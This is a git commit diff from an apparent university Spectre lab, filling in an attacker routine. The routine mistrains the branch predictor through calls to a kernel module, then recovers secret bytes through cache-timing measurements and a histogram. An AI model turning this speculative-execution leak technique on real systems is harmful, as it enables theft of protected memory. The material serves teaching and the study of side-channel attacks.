4fd5306d58b44159ea3a74ffe0392e8759ff13b2
Royzou1 <royeezo@gmail.com>
2025-01-27 13:05:57 +0200

    koke

--- Lab3/SpectreLab/part3-src/attacker-part3.c
+++ Lab3/SpectreLab/part3-src/attacker-part3.c
@@ -43,13 +43,34 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     printf("Launching attacker\n");
 
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
-        char leaked_byte;
-
-        // [Part 3]- Fill this in!
+        int hist[256] = {0};
+        for (int i = 0; i < 50; i++)
+        {
+            char leaked_byte;
+            int min = 100000;
+            for (size_t i = 0; i < 64 ; i++) //fool BP -in part 2.4 we need to change max(i) //rand max i?
+            { 
+                clean_shared_memory_from_tlb(shared_memory);
+                call_kernel_part2(kernel_fd, shared_memory, rand() % 2);
+            }
+            clean_shared_memory_from_tlb(shared_memory);
+            call_kernel_part2(kernel_fd, shared_memory, current_offset);
+            int tmp;
+        
+            for (int i = 0; i < 256; i++) {
+                tmp = time_access(shared_memory + (4096 * i));
+                if (tmp < min) {
+                    min = tmp;
+                    leaked_byte = i;
+                }
+            }
+            hist[leaked_byte]++;
+        }
+        // [Part 2]- Fill this in!
         // leaked_byte = ??
 
-        leaked_str[current_offset] = leaked_byte;
-        if (leaked_byte == '\x00') {
+        leaked_str[current_offset] = max_idx(hist, 256);
+        if (max_idx(hist , 256) == 0) {//'\0'
             break;
         }
     }
